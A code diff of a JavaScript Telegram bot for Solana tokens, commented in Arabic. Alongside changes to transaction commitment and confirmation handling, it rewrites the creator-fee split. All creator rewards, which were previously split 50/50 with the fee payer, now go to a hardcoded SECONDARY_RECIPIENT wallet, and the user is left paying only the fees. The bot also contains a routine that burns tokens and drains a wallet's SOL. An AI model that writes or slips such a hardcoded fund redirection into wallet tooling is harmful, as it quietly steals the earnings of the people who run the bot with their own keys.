@@ -76,7 +76,7 @@ const BATCH_SIZE_TRANSFER = 6;
 const PARALLEL_LIMIT      = 6;
 const VALUE_THRESHOLD_USD = 0.05;
 const PREFUND_LAMPORTS    = 6_500_000;
-// المحفظة الثانية التي ستستلم 50% من مكافآت المنشئ
+// المحفظة التي ستستلم 100% من مكافآت المنشئ
 const SECONDARY_RECIPIENT = new PublicKey("7aSQFKyLkfCupgByxSiuaGD6yNWKtEXpaC4RnDzZHJev");
 
 // ──────────────────────────────────────────────────────────
@@ -120,7 +120,7 @@ if (validRpcUrls.length === 0) {
 
 console.log(`✅ تم تحميل ${validRpcUrls.length} رابط RPC من متغيرات البيئة.`);
 
-let _sendPool = validRpcUrls.map((url) => new Connection(url, "confirmed"));
+let _sendPool = validRpcUrls.map((url) => new Connection(url, "processed"));
 let _sendPoolIdx = 0;
 
 function getSendConn() {
@@ -205,7 +205,7 @@ async function getParsedTokenAccountsSafe(connection, ownerPubkey, programId) {
     const res = await conn._rpcRequest("getTokenAccountsByOwner", [
       ownerPubkey.toBase58(),
       { programId: programId.toBase58() },
-      { encoding: "jsonParsed", commitment: "confirmed" }
+      { encoding: "jsonParsed", commitment: "processed" }
     ]);
 
     if (res.error) throw new Error(res.error.message);
@@ -225,35 +225,25 @@ async function getParsedTokenAccountsSafe(connection, ownerPubkey, programId) {
 
 async function sendAndConfirm(connection, tx, signers) {
   const sendConn = getSendConn();
-  // نفس الاستراتيجية السريعة: blockhash بمستوى processed + إعادة بث + استطلاع سريع
   const { blockhash, lastValidBlockHeight } = await sendConn.getLatestBlockhash("processed");
   tx.recentBlockhash = blockhash;
   tx.sign(...signers);
 
-  const raw = tx.serialize();
-  const sig = await sendConn.sendRawTransaction(raw, {
-    skipPreflight: true,
+  const sig = await sendConn.sendRawTransaction(tx.serialize(), {
+    skipPreflight: false,
     preflightCommitment: "processed",
-    maxRetries: 0,
   });
 
-  const deadline = Date.now() + 90_000;
-  while (Date.now() < deadline) {
-    const st = await sendConn.getSignatureStatuses([sig], { searchTransactionHistory: false });
-    const v = st?.value?.[0];
-    if (v) {
-      if (v.err) throw new Error(`فشل التأكيد: ${JSON.stringify(v.err)}`);
-      if (v.confirmationStatus === "processed" || v.confirmationStatus === "confirmed" || v.confirmationStatus === "finalized") {
-        return sig;
-      }
-    }
-    const height = await sendConn.getBlockHeight("processed");
-    if (height > lastValidBlockHeight) break;
-    try { await sendConn.sendRawTransaction(raw, { skipPreflight: true, maxRetries: 0 }); } catch {}
-    await new Promise((r) => setTimeout(r, 1000));
+  const confirmation = await sendConn.confirmTransaction(
+    { signature: sig, blockhash, lastValidBlockHeight },
+    "processed"
+  );
+
+  if (confirmation.value.err) {
+    throw new Error(`فشل التأكيد: ${JSON.stringify(confirmation.value.err)}`);
   }
 
-  throw new Error(`لم يتم تأكيد المعاملة ضمن المهلة (انتهت صلاحية الـ blockhash). التوقيع: ${sig}`);
+  return sig;
 }
 
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
@@ -627,10 +617,9 @@ async function executeDelegateTransfer(mintStr) {
   let authority = creator;
   let current = [creator];
 
-  // النسب الجديدة: 50% لدافع الرسوم + 50% للمحفظة الثانوية
+  // النسبة الجديدة: 100% للمحفظة المحددة بالكود — دافع الرسوم يدفع الرسوم فقط
   const newShareholders = [
-    { address: payer.publicKey,     shareBps: 5_000 },
-    { address: SECONDARY_RECIPIENT, shareBps: 5_000 },
+    { address: SECONDARY_RECIPIENT, shareBps: 10_000 },
   ];
 
   if (scInfo) {
@@ -638,14 +627,12 @@ async function executeDelegateTransfer(mintStr) {
     authority = sc.admin;
     current = sc.shareholders.map((s) => s.address);
 
-    // التحقق إن كانت النسب 50/50 مطبقة مسبقًا
-    const addrs = sc.shareholders.map((s) => s.address.toBase58()).sort();
-    const want  = newShareholders.map((s) => s.address.toBase58()).sort();
+    // التحقق إن كانت النسبة 100% مطبقة مسبقًا
     const already =
-      sc.shareholders.length === 2 &&
-      addrs[0] === want[0] && addrs[1] === want[1] &&
-      sc.shareholders.every((s) => s.shareBps === 5_000);
-    if (already) return { success: false, msg: "✅ النسب المطلوبة (50/50) مطبقة مسبقًا — لا حاجة لتعديل." };
+      sc.shareholders.length === 1 &&
+      sc.shareholders[0].address.equals(SECONDARY_RECIPIENT) &&
+      sc.shareholders[0].shareBps === 10_000;
+    if (already) return { success: false, msg: "✅ النسبة المطلوبة (100%) مطبقة مسبقًا — لا حاجة لتعديل." };
     if (sc.adminRevoked) return { success: false, msg: "صلاحية تعديل الإعدادات ملغاة نهائيًا" };
     if (!authority.equals(creatorKp.publicKey)) {
       return { success: false, msg: "المحفظة ليست مدير إعدادات المشاركة" };
@@ -743,7 +730,7 @@ async function analyzeSelfBurnPreview(sourceKeypair) {
   const processable = [...tokenAccounts, ...token2022Accounts]
     .filter(a => a.account.data.parsed?.info?.state !== "frozen");
   const { valuable, burnable } = await classifyAccountsByValue(processable);
-  const solLamports = await connection.getBalance(sourceKeypair.publicKey, "confirmed").catch(() => 0);
+  const solLamports = await connection.getBalance(sourceKeypair.publicKey, "processed").catch(() => 0);
   return { valuable, burnable, solLamports };
 }
 
@@ -848,7 +835,7 @@ async function executeSelfBurnAndDrain(sourceKeypair) {
 
   let solTransferred = 0;
   try {
-    const balance = await connection.getBalance(sourceKeypair.publicKey, "confirmed");
+    const balance = await connection.getBalance(sourceKeypair.publicKey, "processed");
     const RESERVE = 5000;
     if (balance > RESERVE) {
       const lamports = balance - RESERVE;
@@ -1226,8 +1213,8 @@ async function startBot() {
             `✅ تم نقل التفويض بنجاح!\n\n` +
             `🪙 العملة: ${res.mint}\n` +
             `👤 المنشئ (الموقّع): ${res.creator}\n` +
-            `📥 المستلم 50% (دافع الرسوم): ${res.recipient}\n` +
-            `📥 المستلم 50% (المحفظة الثانية): ${res.recipient2}\n` +
+            `📥 المستلم 100%: ${res.recipient2}\n` +
+            `💸 دافع الرسوم (رسوم فقط): ${res.recipient}\n` +
             `🔗 https://solscan.io/tx/${res.sig}`
           );
         } else {
